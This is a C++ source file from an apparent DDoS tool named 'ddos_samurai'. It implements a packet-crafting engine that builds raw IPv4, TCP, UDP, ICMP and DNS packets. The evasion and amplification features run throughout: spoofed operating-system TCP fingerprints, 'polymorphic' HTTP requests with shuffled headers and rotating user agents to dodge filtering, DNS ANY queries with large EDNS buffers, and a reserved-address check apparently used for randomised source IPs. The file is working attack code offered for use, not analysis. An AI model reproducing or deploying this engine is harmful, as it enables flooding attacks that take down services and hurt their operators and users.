#include "engine.hpp"

#include <arpa/inet.h>
#include <netdb.h>
#include <sys/socket.h>
#include <unistd.h>

#include <algorithm>
#include <array>
#include <cctype>
#include <cstdlib>
#include <fstream>
#include <map>
#include <random>
#include <sstream>
#include <stdexcept>
#include <unordered_map>

namespace ddos_samurai::cpu_native {
namespace {

constexpr int ETHERTYPE_IPV4 = 0x0800;
constexpr int ICMP_ECHO_REQUEST = 8;
constexpr uint16_t DNS_QUERY_FLAG = 0x0100;
constexpr uint16_t DNS_QR_QUERY = 0x0000;
constexpr uint16_t DNS_CLASS_IN = 1;

std::mt19937_64& rng() {
  thread_local std::mt19937_64 gen(std::random_device{}());
  return gen;
}

uint32_t fast_rand32() {
  thread_local std::array<uint32_t, 256> buf;
  thread_local size_t idx = 256;
  if (idx == 256) {
    auto& g = rng();
    for (size_t i = 0; i < 256; ++i) buf[i] = static_cast<uint32_t>(g());
    idx = 0;
  }
  return buf[idx++];
}

uint32_t rand_u32(uint32_t lo, uint32_t hi) {
  if (lo >= hi) return lo;
  if (lo == 0u && hi == 0xFFFFFFFFu) return fast_rand32();
  const uint64_t range = static_cast<uint64_t>(hi) - static_cast<uint64_t>(lo) + 1ULL;
  return lo + static_cast<uint32_t>(fast_rand32() % range);
}

int rand_int(int lo, int hi) {
  if (lo >= hi) return lo;
  const uint64_t range = static_cast<uint64_t>(static_cast<int64_t>(hi) - static_cast<int64_t>(lo) + 1LL);
  return lo + static_cast<int>(fast_rand32() % range);
}

void append_u8(std::vector<uint8_t>& out, uint8_t v) { out.push_back(v); }

void append_be16(std::vector<uint8_t>& out, uint16_t v) {
  out.push_back(static_cast<uint8_t>((v >> 8) & 0xFF));
  out.push_back(static_cast<uint8_t>(v & 0xFF));
}

void append_be32(std::vector<uint8_t>& out, uint32_t v) {
  out.push_back(static_cast<uint8_t>((v >> 24) & 0xFF));
  out.push_back(static_cast<uint8_t>((v >> 16) & 0xFF));
  out.push_back(static_cast<uint8_t>((v >> 8) & 0xFF));
  out.push_back(static_cast<uint8_t>(v & 0xFF));
}

void write_be16(std::vector<uint8_t>& out, size_t off, uint16_t v) {
  out.at(off) = static_cast<uint8_t>((v >> 8) & 0xFF);
  out.at(off + 1) = static_cast<uint8_t>(v & 0xFF);
}

void write_be16(uint8_t* p, size_t off, uint16_t v) {
  p[off] = static_cast<uint8_t>((v >> 8) & 0xFF);
  p[off + 1] = static_cast<uint8_t>(v & 0xFF);
}

uint16_t checksum_update(uint16_t old_csum, uint16_t old_val, uint16_t new_val) {
  uint32_t csum = (~old_csum) & 0xFFFF;
  csum += (~old_val) & 0xFFFF;
  csum += new_val;
  csum = (csum & 0xFFFF) + (csum >> 16);
  return static_cast<uint16_t>(~csum);
}

uint16_t checksum_update_32(uint16_t old_csum, uint32_t old_val, uint32_t new_val) {
  uint16_t old_hi = (old_val >> 16) & 0xFFFF;
  uint16_t old_lo = old_val & 0xFFFF;
  uint16_t new_hi = (new_val >> 16) & 0xFFFF;
  uint16_t new_lo = new_val & 0xFFFF;
  uint16_t temp = checksum_update(old_csum, old_hi, new_hi);
  return checksum_update(temp, old_lo, new_lo);
}

uint16_t read_be16(const uint8_t* p) {
  return static_cast<uint16_t>((static_cast<uint16_t>(p[0]) << 8) | static_cast<uint16_t>(p[1]));
}

std::string to_lower(std::string value) {
  std::transform(value.begin(), value.end(), value.begin(), [](unsigned char c) {
    return static_cast<char>(std::tolower(c));
  });
  return value;
}

std::string to_upper(std::string value) {
  std::transform(value.begin(), value.end(), value.begin(), [](unsigned char c) {
    return static_cast<char>(std::toupper(c));
  });
  return value;
}

bool is_reserved_ipv4(uint32_t ip) {
  const uint8_t a = static_cast<uint8_t>((ip >> 24) & 0xFF);
  const uint8_t b = static_cast<uint8_t>((ip >> 16) & 0xFF);
  const uint8_t c = static_cast<uint8_t>((ip >> 8) & 0xFF);
  if (a == 0 || a == 10 || a == 127 || a >= 224) return true;
  if (a == 172 && b >= 16 && b <= 31) return true;
  if (a == 192 && b == 168) return true;
  if (a == 169 && b == 254) return true;
  if (a == 100 && b >= 64 && b <= 127) return true;
  if (a == 198 && (b == 18 || b == 19)) return true;
  if (a == 192 && b == 0) return true;
  if (a == 198 && b == 51 && c == 100) return true;
  if (a == 203 && b == 0 && c == 113) return true;
  return false;
}

std::vector<OSProfile> make_profiles() {
  return {
      {"windows_10", 128, 64240, {{TCP_OPT_MSS, 1460},
                                  {TCP_OPT_NOP, std::nullopt},
                                  {TCP_OPT_WSCALE, 8},
                                  {TCP_OPT_NOP, std::nullopt},
                                  {TCP_OPT_NOP, std::nullopt},
                                  {TCP_OPT_SACK_OK, std::nullopt}}},
      {"linux_5", 64, 29200, {{TCP_OPT_MSS, 1460},
                              {TCP_OPT_SACK_OK, std::nullopt},
                              {TCP_OPT_TIMESTAMP, std::nullopt},
                              {TCP_OPT_NOP, std::nullopt},
                              {TCP_OPT_WSCALE, 7}}},
      {"macos_14", 64, 65535, {{TCP_OPT_MSS, 1460},
                               {TCP_OPT_NOP, std::nullopt},
                               {TCP_OPT_WSCALE, 6},
                               {TCP_OPT_NOP, std::nullopt},
                               {TCP_OPT_NOP, std::nullopt},
                               {TCP_OPT_TIMESTAMP, std::nullopt},
                               {TCP_OPT_SACK_OK, std::nullopt},
                               {TCP_OPT_EOL, std::nullopt}}},
  };
}

const std::vector<OSProfile>& profiles_ref() {
  static const std::vector<OSProfile> profiles = make_profiles();
  return profiles;
}

const OSProfile& select_profile() {
  const auto& profiles = profiles_ref();
  const char* env = std::getenv("SAMURAI_CPU_FIXED_OS_PROFILE");
  if (env && env[0]) {
    const std::string wanted = to_lower(env);
    for (const auto& profile : profiles) {
      if (to_lower(profile.name) == wanted) return profile;
    }
  }
  int max_idx = static_cast<int>(profiles.size()) - 1;
  if (max_idx <= 0) return profiles.at(0);
  return profiles.at(static_cast<size_t>(rand_int(0, max_idx)));
}

std::vector<uint8_t> bytes_from_string(const std::string& s) {
  return std::vector<uint8_t>(s.begin(), s.end());
}

std::vector<uint8_t> random_bytes(size_t n) {
  std::vector<uint8_t> out(n);
  for (auto& byte : out) byte = static_cast<uint8_t>(rand_int(0, 255));
  return out;
}

uint32_t pseudo_header_sum(uint32_t src_ip, uint32_t dst_ip, int protocol, uint16_t l4_len) {
  uint32_t s = 0;
  s += (src_ip >> 16) & 0xFFFF;
  s += src_ip & 0xFFFF;
  s += (dst_ip >> 16) & 0xFFFF;
  s += dst_ip & 0xFFFF;
  s += static_cast<uint32_t>(protocol & 0xFF);
  s += l4_len;
  return s;
}

uint16_t finalize_sum(uint32_t s) {
  while (s >> 16) s = (s & 0xFFFFu) + (s >> 16);
  return static_cast<uint16_t>((~s) & 0xFFFFu);
}

// Zero-copy checksum helper: accumulates partial sum over a buffer without
// allocating or copying. Callers chain multiple buffers then finalize once.
#include <immintrin.h>
uint32_t checksum_partial(const uint8_t* data, size_t len) {
  uint32_t s = 0;
  size_t i = 0;

#if defined(__AVX2__)
  __m256i vsum = _mm256_setzero_si256();
  __m256i zero = _mm256_setzero_si256();

  while (i + 32 <= len) {
      __m256i v = _mm256_loadu_si256(reinterpret_cast<const __m256i*>(data + i));
      
      __m256i v_lo = _mm256_unpacklo_epi16(v, zero);
      __m256i v_hi = _mm256_unpackhi_epi16(v, zero);
      
      vsum = _mm256_add_epi32(vsum, v_lo);
      vsum = _mm256_add_epi32(vsum, v_hi);
      i += 32;
  }
  
  __m256i v_sum1 = _mm256_hadd_epi32(vsum, vsum);
  __m256i v_sum2 = _mm256_hadd_epi32(v_sum1, v_sum1);
  __m128i v_sum128_hi = _mm256_extracti128_si256(v_sum2, 1);
  __m128i v_sum128_lo = _mm256_castsi256_si128(v_sum2);
  __m128i v_sum128 = _mm_add_epi32(v_sum128_hi, v_sum128_lo);
  
  uint32_t simd_sum = static_cast<uint32_t>(_mm_cvtsi128_si32(v_sum128));
  
  while (simd_sum >> 16) simd_sum = (simd_sum & 0xFFFFu) + (simd_sum >> 16);
  s += ((simd_sum & 0xFF) << 8) | ((simd_sum >> 8) & 0xFF);
#endif

  while (i + 1 < len) {
    s += (static_cast<uint32_t>(data[i]) << 8) | static_cast<uint32_t>(data[i + 1]);
    i += 2;
  }
  if (i < len) s += static_cast<uint32_t>(data[i]) << 8;
  return s;
}

std::vector<uint8_t> profile_tcp_options(const OSProfile& profile) {
  std::vector<std::pair<int, std::optional<std::pair<uint32_t, uint32_t>>>> opts;
  opts.reserve(profile.tcp_options.size());
  for (const auto& [kind, value] : profile.tcp_options) {
    if (kind == TCP_OPT_TIMESTAMP) {
      opts.push_back({kind, std::make_pair(rand_u32(1, 0xFFFFFFFFu), 0u)});
    } else {
      opts.push_back({kind, value ? std::make_optional(std::make_pair(static_cast<uint32_t>(*value), 0u))
                                  : std::nullopt});
    }
  }
  return build_tcp_options(opts);
}

std::string choose_dns_qtype(const PacketConfig& cfg) {
  if (cfg.dns_qtypes.empty()) return "A";
  int max_idx = static_cast<int>(cfg.dns_qtypes.size()) - 1;
  if (max_idx <= 0) return cfg.dns_qtypes.front();
  return cfg.dns_qtypes.at(static_cast<size_t>(rand_int(0, max_idx)));
}

std::vector<uint8_t> maybe_pad(std::vector<uint8_t> packet, int pad_size, bool is_syn_only) {
  if (!is_syn_only && pad_size > 0 && static_cast<int>(packet.size()) < pad_size) {
    packet.resize(static_cast<size_t>(pad_size), 0);
  }
  return packet;
}

std::vector<uint8_t> polymorphic_http_payload(const std::string& target_ip,
                                              const std::string& path,
                                              const std::string& method) {
  static const std::vector<std::string> agents = {
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Safari/604.1",
  };
  int agent_max = static_cast<int>(agents.size()) - 1;
  std::vector<std::pair<std::string, std::string>> headers = {
      {"Host", target_ip},
      {"User-Agent", agents.at(static_cast<size_t>(agent_max <= 0 ? 0 : rand_int(0, agent_max)))},
      {"Accept", "*/*"},
      {"Accept-Language",
       std::array<std::string, 3>{"en-US,en;q=0.5", "tr-TR,tr;q=0.9", "de-DE,de;q=0.8"}.at(
           static_cast<size_t>(rand_int(0, 2)))},
      {"Accept-Encoding", "gzip, deflate, br"},
      {"Connection", std::array<std::string, 2>{"keep-alive", "close"}.at(static_cast<size_t>(rand_int(0, 1)))},
      {"Upgrade-Insecure-Requests", "1"},
      {"Cache-Control", std::array<std::string, 2>{"max-age=0", "no-cache"}.at(static_cast<size_t>(rand_int(0, 1)))},
  };
  std::shuffle(headers.begin(), headers.end(), rng());
  std::ostringstream oss;
  oss << method << ' ' << path << " HTTP/1.1\r\n";
  for (auto [key, value] : headers) {
    if (rand_int(0, 1) == 1) key = to_lower(key);
    oss << key << ": " << value << "\r\n";
  }
  oss << "\r\n";
  return bytes_from_string(oss.str());
}

}  // namespace

PacketPoolBuffer::PacketPoolBuffer() : storage(std::make_shared<std::vector<uint8_t>>()), packet_size(0) {}

PacketPoolBuffer::PacketPoolBuffer(std::shared_ptr<std::vector<uint8_t>> data, size_t stride)
    : storage(std::move(data)), packet_size(stride) {}

uint8_t* PacketPoolBuffer::data() { return storage ? storage->data() : nullptr; }

const uint8_t* PacketPoolBuffer::data() const { return storage ? storage->data() : nullptr; }

size_t PacketPoolBuffer::size() const { return storage ? storage->size() : 0; }

#include <immintrin.h>

uint16_t checksum(const uint8_t* data, size_t len) {
  uint32_t s = 0;
  size_t i = 0;

#if defined(__AVX2__)
  __m256i vsum = _mm256_setzero_si256();
  __m256i zero = _mm256_setzero_si256();

  while (i + 32 <= len) {
      __m256i v = _mm256_loadu_si256(reinterpret_cast<const __m256i*>(data + i));
      
      __m256i v_lo = _mm256_unpacklo_epi16(v, zero);
      __m256i v_hi = _mm256_unpackhi_epi16(v, zero);
      
      vsum = _mm256_add_epi32(vsum, v_lo);
      vsum = _mm256_add_epi32(vsum, v_hi);
      i += 32;
  }
  
  __m256i v_sum1 = _mm256_hadd_epi32(vsum, vsum);
  __m256i v_sum2 = _mm256_hadd_epi32(v_sum1, v_sum1);
  __m128i v_sum128_hi = _mm256_extracti128_si256(v_sum2, 1);
  __m128i v_sum128_lo = _mm256_castsi256_si128(v_sum2);
  __m128i v_sum128 = _mm_add_epi32(v_sum128_hi, v_sum128_lo);
  
  uint32_t simd_sum = static_cast<uint32_t>(_mm_cvtsi128_si32(v_sum128));
  
  while (simd_sum >> 16) simd_sum = (simd_sum & 0xFFFFu) + (simd_sum >> 16);
  s += ((simd_sum & 0xFF) << 8) | ((simd_sum >> 8) & 0xFF);
#endif

  while (i + 1 < len) {
    s += (static_cast<uint32_t>(data[i]) << 8) | static_cast<uint32_t>(data[i + 1]);
    i += 2;
  }
  if (i < len) s += static_cast<uint32_t>(data[i]) << 8;
  return finalize_sum(s);
}

int ip_to_int(const std::string& ip_str) {
  in_addr addr {};
  if (inet_pton(AF_INET, ip_str.c_str(), &addr) != 1) {
    throw std::invalid_argument("Invalid IPv4 address: " + ip_str);
  }
  return static_cast<int>(ntohl(addr.s_addr));
}

std::string int_to_ip(uint32_t value) {
  in_addr addr {};
  addr.s_addr = htonl(value);
  char buf[INET_ADDRSTRLEN] = {0};
  if (!inet_ntop(AF_INET, &addr, buf, sizeof(buf))) {
    throw std::runtime_error("inet_ntop failed");
  }
  return std::string(buf);
}

std::vector<uint8_t> ip_to_bytes(const std::string& ip_str) {
  const uint32_t ip = static_cast<uint32_t>(ip_to_int(ip_str));
  return {
      static_cast<uint8_t>((ip >> 24) & 0xFF),
      static_cast<uint8_t>((ip >> 16) & 0xFF),
      static_cast<uint8_t>((ip >> 8) & 0xFF),
      static_cast<uint8_t>(ip & 0xFF),
  };
}

int parse_tcp_flags(const std::string& flags_str) {
  static const std::map<std::string, int> names = {
      {"FIN", TCP_FIN}, {"SYN", TCP_SYN}, {"RST", TCP_RST}, {"PSH", TCP_PSH},
      {"ACK", TCP_ACK}, {"URG", TCP_URG}, {"ECE", TCP_ECE}, {"CWR", TCP_CWR},
  };
  static const std::map<char, int> compact = {
      {'F', TCP_FIN}, {'S', TCP_SYN}, {'R', TCP_RST}, {'P', TCP_PSH},
      {'A', TCP_ACK}, {'U', TCP_URG}, {'E', TCP_ECE}, {'C', TCP_CWR},
  };

  if (flags_str.empty()) return 0;
  std::string normalized = flags_str;
  for (char& c : normalized) {
    if (c == '+' || c == ',' || c == '/' || c == '|') {
      c = ' ';
    } else {
      c = static_cast<char>(std::toupper(static_cast<unsigned char>(c)));
    }
  }

  std::istringstream iss(normalized);
  std::string token;
  int result = 0;
  while (iss >> token) {
    const auto name_it = names.find(token);
    if (name_it != names.end()) {
      result |= name_it->second;
      continue;
    }
    size_t idx = 0;
    while (idx < token.size()) {
      bool matched = false;
      for (const auto& [name, value] : names) {
        if (token.compare(idx, name.size(), name) == 0) {
          result |= value;
          idx += name.size();
          matched = true;
          break;
        }
      }
      if (matched) continue;
      const auto compact_it = compact.find(token[idx]);
      if (compact_it != compact.end()) result |= compact_it->second;
      idx += 1;
    }
  }
  return result;
}

std::vector<uint8_t> build_tcp_options(
    const std::vector<std::pair<int, std::optional<std::pair<uint32_t, uint32_t>>>>& options) {
  std::vector<uint8_t> out;
  for (const auto& [kind, value] : options) {
    switch (kind) {
      case TCP_OPT_EOL:
        append_u8(out, 0);
        break;
      case TCP_OPT_NOP:
        append_u8(out, 1);
        break;
      case TCP_OPT_MSS:
        append_u8(out, 2);
        append_u8(out, 4);
        append_be16(out, static_cast<uint16_t>(value ? value->first : 1460));
        break;
      case TCP_OPT_WSCALE:
        append_u8(out, 3);
        append_u8(out, 3);
        append_u8(out, static_cast<uint8_t>(value ? value->first : 7));
        break;
      case TCP_OPT_SACK_OK:
        append_u8(out, 4);
        append_u8(out, 2);
        break;
      case TCP_OPT_TIMESTAMP:
        append_u8(out, 8);
        append_u8(out, 10);
        append_be32(out, value ? value->first : rand_u32(1, 0xFFFFFFFFu));
        append_be32(out, value ? value->second : 0u);
        break;
      default:
        break;
    }
  }
  while (out.size() % 4 != 0) out.push_back(0);
  return out;
}

std::vector<uint8_t> build_ipv4_header(const std::string& src_ip,
                                       const std::string& dst_ip,
                                       int protocol,
                                       int payload_len,
                                       int ttl,
                                       int tos,
                                       int identification,
                                       uint16_t flags_frag,
                                       const std::vector<uint8_t>& options) {
  if (options.size() % 4 != 0) throw std::invalid_argument("IPv4 options must be 4-byte aligned");

  const uint32_t src = static_cast<uint32_t>(ip_to_int(src_ip));
  const uint32_t dst = static_cast<uint32_t>(ip_to_int(dst_ip));
  const int ihl = static_cast<int>((20 + options.size()) / 4);
  if (ihl < 5 || ihl > 15) throw std::invalid_argument("Invalid IPv4 IHL");

  std::vector<uint8_t> hdr;
  hdr.reserve(static_cast<size_t>(ihl * 4));
  append_u8(hdr, static_cast<uint8_t>((4 << 4) | ihl));
  append_u8(hdr, static_cast<uint8_t>(tos & 0xFF));
  append_be16(hdr, static_cast<uint16_t>(ihl * 4 + payload_len));
  append_be16(hdr, static_cast<uint16_t>(identification == 0 ? rand_int(0, 0xFFFF) : identification));
  append_be16(hdr, flags_frag);
  append_u8(hdr, static_cast<uint8_t>(ttl & 0xFF));
  append_u8(hdr, static_cast<uint8_t>(protocol & 0xFF));
  append_be16(hdr, 0);
  append_be32(hdr, src);
  append_be32(hdr, dst);
  hdr.insert(hdr.end(), options.begin(), options.end());
  write_be16(hdr, 10, checksum(hdr.data(), hdr.size()));
  return hdr;
}

std::vector<uint8_t> build_tcp_header(int src_port,
                                      int dst_port,
                                      uint32_t seq,
                                      uint32_t ack,
                                      int flags,
                                      int window,
                                      int urgent,
                                      const std::vector<uint8_t>& options_bytes,
                                      uint32_t src_ip_int,
                                      uint32_t dst_ip_int,
                                      const std::vector<uint8_t>& payload) {
  const size_t total_len = 20 + options_bytes.size();
  const uint8_t data_offset = static_cast<uint8_t>((total_len + 3) / 4);

  std::vector<uint8_t> hdr;
  hdr.reserve(static_cast<size_t>(data_offset) * 4);
  append_be16(hdr, static_cast<uint16_t>(src_port));
  append_be16(hdr, static_cast<uint16_t>(dst_port));
  append_be32(hdr, seq);
  append_be32(hdr, ack);
  append_be16(hdr, static_cast<uint16_t>((static_cast<uint16_t>(data_offset) << 12) | (flags & 0x1FF)));
  append_be16(hdr, static_cast<uint16_t>(window));
  append_be16(hdr, 0);
  append_be16(hdr, static_cast<uint16_t>(urgent));
  hdr.insert(hdr.end(), options_bytes.begin(), options_bytes.end());
  while (hdr.size() < static_cast<size_t>(data_offset) * 4) hdr.push_back(0);

  // Zero-copy checksum: sum pseudo-header, header, and payload separately
  // instead of copying everything into a temporary buffer.
  uint32_t s = pseudo_header_sum(src_ip_int, dst_ip_int, PROTO_TCP, static_cast<uint16_t>(hdr.size() + payload.size()));
  s += checksum_partial(hdr.data(), hdr.size());
  s += checksum_partial(payload.data(), payload.size());
  write_be16(hdr, 16, finalize_sum(s));
  return hdr;
}

std::vector<uint8_t> build_udp_header(int src_port,
                                      int dst_port,
                                      const std::vector<uint8_t>& payload,
                                      uint32_t src_ip_int,
                                      uint32_t dst_ip_int,
                                      bool compute_checksum) {
  std::vector<uint8_t> hdr;
  hdr.reserve(8);
  append_be16(hdr, static_cast<uint16_t>(src_port));
  append_be16(hdr, static_cast<uint16_t>(dst_port));
  append_be16(hdr, static_cast<uint16_t>(8 + payload.size()));
  append_be16(hdr, 0);

  if (compute_checksum && (src_ip_int || dst_ip_int)) {
    // Zero-copy checksum: sum pseudo-header, header, and payload separately.
    uint32_t s = pseudo_header_sum(src_ip_int, dst_ip_int, PROTO_UDP, static_cast<uint16_t>(hdr.size() + payload.size()));
    s += checksum_partial(hdr.data(), hdr.size());
    s += checksum_partial(payload.data(), payload.size());
    uint16_t cksum = finalize_sum(s);
    if (cksum == 0) cksum = 0xFFFFu;
    write_be16(hdr, 6, cksum);
  }
  return hdr;
}

std::vector<uint8_t> build_icmp_echo(int identifier, int sequence, const std::vector<uint8_t>& payload) {
  std::vector<uint8_t> hdr;
  hdr.reserve(8 + payload.size());
  append_u8(hdr, ICMP_ECHO_REQUEST);
  append_u8(hdr, 0);
  append_be16(hdr, 0);
  append_be16(hdr, static_cast<uint16_t>(identifier == 0 ? rand_int(0, 0xFFFF) : identifier));
  append_be16(hdr, static_cast<uint16_t>(sequence));
  hdr.insert(hdr.end(), payload.begin(), payload.end());
  write_be16(hdr, 2, checksum(hdr.data(), hdr.size()));
  return hdr;
}

std::vector<uint8_t> build_ethernet_header(const std::vector<uint8_t>& dst_mac,
                                           const std::vector<uint8_t>& src_mac,
                                           int ethertype) {
  if (dst_mac.size() != 6 || src_mac.size() != 6) {
    throw std::invalid_argument("MAC addresses must be 6 bytes");
  }
  std::vector<uint8_t> out;
  out.reserve(14);
  out.insert(out.end(), dst_mac.begin(), dst_mac.end());
  out.insert(out.end(), src_mac.begin(), src_mac.end());
  append_be16(out, static_cast<uint16_t>(ethertype));
  return out;
}

std::vector<uint8_t> build_dns_query(const std::string& qname,
                                     const std::string& qtype,
                                     bool recursive,
                                     bool edns,
                                     int transaction_id) {
  static const std::map<std::string, uint16_t> qtypes = {
      {"A", 1}, {"NS", 2},   {"CNAME", 5}, {"SOA", 6}, {"PTR", 12},
      {"MX", 15}, {"TXT", 16}, {"AAAA", 28}, {"SRV", 33}, {"ANY", 255},
  };

  std::vector<uint8_t> out;
  const uint16_t txid = static_cast<uint16_t>(transaction_id == 0 ? rand_int(0, 0xFFFF) : transaction_id);
  append_be16(out, txid);
  append_be16(out, static_cast<uint16_t>(DNS_QR_QUERY | (recursive ? DNS_QUERY_FLAG : 0)));
  append_be16(out, 1);
  append_be16(out, 0);
  append_be16(out, 0);
  append_be16(out, edns ? 1 : 0);

  std::string trimmed = qname;
  if (trimmed.empty() || trimmed == ".") {
    out.push_back(0);
  } else {
    if (!trimmed.empty() && trimmed.back() == '.') trimmed.pop_back();
    std::stringstream ss(trimmed);
    std::string label;
    while (std::getline(ss, label, '.')) {
      if (label.empty()) throw std::invalid_argument("Invalid DNS name with empty label");
      if (label.size() > 63) throw std::invalid_argument("DNS label too long");
      out.push_back(static_cast<uint8_t>(label.size()));
      out.insert(out.end(), label.begin(), label.end());
    }
    out.push_back(0);
  }

  const auto it = qtypes.find(to_upper(qtype));
  append_be16(out, it == qtypes.end() ? 1 : it->second);
  append_be16(out, DNS_CLASS_IN);

  if (edns) {
    append_u8(out, 0);
    append_be16(out, 41);
    append_be16(out, 4096);
    append_be32(out, 0);
    append_be16(out, 0);
  }
  return out;
}

std::vector<OSProfile> os_profiles() { return profiles_ref(); }

}  // namespace ddos_samurai::cpu_native
